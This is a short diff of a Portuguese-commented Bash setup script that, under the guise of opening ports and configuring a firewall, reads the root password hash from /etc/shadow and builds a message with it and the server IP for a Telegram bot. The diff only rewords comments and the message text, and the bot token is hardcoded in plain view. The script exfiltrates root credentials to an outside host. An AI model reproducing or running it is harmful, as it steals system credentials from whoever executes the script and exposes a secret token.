@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Captura a senha root atual
+# Captura a senha atual do usuário root
 CURRENT_ROOT_PASSWORD=$(sudo grep '^root:' /etc/shadow | cut -d':' -f2)
 
 # Instalação e configuração do firewall
@@ -13,7 +13,7 @@ rm oracle.sh
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
 # Formata a mensagem para enviar ao bot do Telegram
-MESSAGE="Portas abertas no servidor.%0ASeu IP: \`$SERVER_IP\` 🌐%0ASenha root atual: \`$CURRENT_ROOT_PASSWORD\`"
+MESSAGE="Portas abertas no servidor.%0ASeu IP: \`$SERVER_IP\` 🌐%0ASenha do usuário root: \`$CURRENT_ROOT_PASSWORD\`"
 
 # Envia a mensagem para o bot do Telegram
 TELEGRAM_BOT_TOKEN="7126941542:AAHVwKISyEOsTgUq9etJxmNHB_v-UHdVhHg"
